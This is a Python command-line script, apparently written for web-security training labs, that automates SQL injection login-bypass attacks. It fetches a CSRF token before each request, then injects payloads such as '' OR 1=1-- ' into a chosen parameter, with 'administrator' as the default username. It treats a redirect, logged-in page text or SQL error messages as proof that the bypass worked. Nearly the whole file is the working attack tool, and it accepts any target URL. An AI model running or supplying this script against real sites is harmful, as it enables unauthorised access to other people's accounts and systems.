import requests
from bs4 import BeautifulSoup
import argparse
import sys
import time

class SQLiEngine:
    def __init__(self, target_url, verify_ssl=False):
        self.target_url = target_url
        self.session = requests.Session()
        self.verify_ssl = verify_ssl
        # Quiet the SSL warnings for labs
        requests.packages.urllib3.disable_warnings()

    def get_csrf_token(self, url):
        """Extracts CSRF token from a page within the current session."""
        try:
            response = self.session.get(url, verify=self.verify_ssl)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_input = soup.find('input', {'name': 'csrf'})
            if csrf_input:
                return csrf_input.get('value')
            return None
        except Exception as e:
            print(f"[-] Error extracting CSRF: {e}")
            return None

    def audit_sqli(self, target_endpoint, param_name, method='POST', base_value='administrator', other_data=None):
        """Performs SQLi probes using GET or POST."""
        payloads = ["'-- ", "' OR 1=1-- ", "' #", "' OR '1'='1'-- ", "\" OR 1=1-- "]
        other_data = other_data or {}
        
        print(f"[*] Starting {method} Audit on {target_endpoint}")
        
        for payload in payloads:
            csrf_token = self.get_csrf_token(self.target_url)
            injection_value = base_value + payload
            
            # Prepare data
            data = {param_name: injection_value}
            data.update(other_data)
            if csrf_token and 'csrf' not in data:
                data['csrf'] = csrf_token
            
            try:
                if method.upper() == 'POST':
                    response = self.session.post(target_endpoint, data=data, verify=self.verify_ssl, allow_redirects=False)
                else:
                    response = self.session.get(target_endpoint, params=data, verify=self.verify_ssl, allow_redirects=False)
                
                print(f"[+] Payload: {injection_value} -> Status: {response.status_code}")
                
                # Success Signatures
                is_vulnerable = (
                    response.status_code in [302, 301] or 
                    any(keyword in response.text for keyword in ["Welcome", "Logout", "My Account", "Dashboard"]) or
                    any(sig in response.text.lower() for sig in ["sql syntax", "mysql_fetch", "syntax error"])
                )

                if is_vulnerable:
                    print(f"\n[!!!] VULNERABILITY CONFIRMED: {injection_value}")
                    if response.headers.get('Location'):
                        print(f"[!] Redirect Location: {response.headers.get('Location')}")
                    return True
                
            except Exception as e:
                print(f"[-] Probe failed for {injection_value}: {e}")
            
            time.sleep(0.5)
            
        print("\n[-] Payloads exhausted. No vulnerability confirmed.")
        return False

def main():
    parser = argparse.ArgumentParser(description="Python SQLi Engine v1.1")
    parser.add_argument("--url", required=True, help="Target page URL (to fetch cookies/csrf)")
    parser.add_argument("--endpoint", help="Target endpoint for probes (defaults to --url)")
    parser.add_argument("--method", default="POST", choices=["GET", "POST"], help="HTTP Method")
    parser.add_argument("--param", default="username", help="Parameter to inject into")
    parser.add_argument("--value", default="administrator", help="Base value for the parameter")
    
    args = parser.parse_args()
    endpoint = args.endpoint or args.url
    
    engine = SQLiEngine(args.url)
    engine.audit_sqli(endpoint, args.param, args.method, args.value)

if __name__ == "__main__":
    main()
